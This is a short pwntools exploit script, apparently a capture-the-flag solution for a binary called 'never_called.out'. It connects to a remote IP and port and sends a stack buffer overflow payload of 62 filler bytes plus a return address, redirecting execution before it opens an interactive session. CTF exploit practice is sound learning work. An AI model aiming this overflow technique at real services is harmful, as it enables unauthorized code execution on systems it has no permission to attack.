#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template never_called.out --host 213.133.103.186 --port 32867
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('never_called.out')
pty = process.PTY
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '213.133.103.186'
port = int(args.PORT or 32867)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, stdout=pty, stdin=pty, *a, **kw)
    if args.EDB:
        return process(["edb", "--run", exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)
    else:
        return process([exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

offset = 62
payload = flat(
    b'A' * 62,
    p32(0x565562ab),
)

io.recvuntil(b'Enter your name:')
io.sendline(payload)

io.interactive()

